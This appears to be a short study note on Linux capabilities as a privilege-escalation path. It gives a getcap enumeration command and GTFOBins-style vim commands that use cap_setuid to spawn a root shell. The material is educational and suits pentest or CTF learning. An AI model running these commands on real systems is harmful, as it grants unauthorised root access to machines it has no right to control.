## What is Capabilities ?

**Linux Capabilities** are a security feature that breaks down the all-powerful "root" (superuser) privileges into smaller, distinct units of power. Instead of giving a process full administrative access to the entire system, capabilities allow you to grant a program only the **specific, limited permissions** it needs to perform a particular task.

## 1. Enumeration (Finding the Capabilities)

***1st we have to find the capabilities***

```
getcap -r / 2>/dev/null
```


![[capabilities.png]]

***In this the capability says vim can set it's uid to other users .So we can use GTFOBins for vim's setuid+ep capabilities .***

```
:set shell=/bin/sh
:shell
```

***or :***

```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

















---